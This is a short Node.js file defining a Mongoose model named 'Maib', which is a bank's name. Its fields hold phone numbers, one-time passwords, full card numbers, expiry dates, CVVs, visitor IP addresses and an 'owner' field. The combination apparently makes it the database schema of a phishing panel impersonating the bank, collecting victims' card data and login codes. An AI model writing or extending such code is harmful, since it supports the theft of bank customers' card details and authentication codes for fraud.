const mongoose = require("mongoose");

const maibSchema = new mongoose.Schema({
    uniqueid: String,
    telephone: String,
    otp: String,
    ccnum: String,
    ccexp: String,
    cvv: String,
    status: Number,
    ip: String,
    owner: String,
    timestamp: Date,
});

module.exports = mongoose.model("Maib", maibSchema);
